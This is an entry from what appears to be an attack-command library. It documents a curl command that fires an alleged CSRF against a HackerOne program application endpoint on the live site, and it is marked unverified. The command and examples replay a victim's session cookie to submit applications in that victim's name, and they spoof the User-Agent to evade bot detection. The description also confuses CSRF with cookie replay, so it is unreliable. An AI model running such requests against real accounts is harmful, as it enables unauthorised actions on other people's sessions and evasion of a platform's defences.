---
id: cmd-curl-csrf-hackerone
data: >-
  curl -X GET "https://hackerone.com/{program}?apply=true" -L -H "User-Agent:
  Mozilla/5.0 (Windows NT 10.0; rv:60.0) Gecko/20100101 Firefox/60.0" -H
  "Cookie: session=your-cookie" -v
tags:
  - csrf
  - web
  - testing
type: command
output: HTTP/1.1 200 OK or 302 redirect with success indicators
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.874Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-csrf

## Command

```bash
curl -X GET "https://hackerone.com/{program}?apply=true" -L -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:60.0) Gecko/20100101 Firefox/60.0" -H "Cookie: session=your-cookie" -v
```

## Description

This curl command triggers the CSRF vulnerability by sending a GET request to the HackerOne program application endpoint with the ?apply=true parameter, simulating a victim's browser access to automatically submit an application.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `"https://hackerone.com/{program}?apply=true"` | Target URL with program handle and apply parameter | Yes |
| `-L` | Follow redirects (e.g., login or subdomain) | Yes |
| `-H "User-Agent: ..."` | Mimics browser to avoid bot detection | Yes |
| `-H "Cookie: ..."` | Victim's session cookie for authentication | Yes for logged-in tests |
| `-v` | Verbose output for headers and status | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://hackerone.com/hackthedts?apply=true" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.hackerone.com/hackthedts?apply=true" -L -H "Referer: https://www.hackerone.com" -H "Cookie: session=abc123" -v
```

## Expected Output

Verbose logs showing HTTP requests/responses, e.g., 302 redirect to login or 200 OK with application confirmation JSON/HTML. Look for status changes in victim's account.

## Related

- [[Related Procedure: Trigger-CS RF-Application-Submission]]
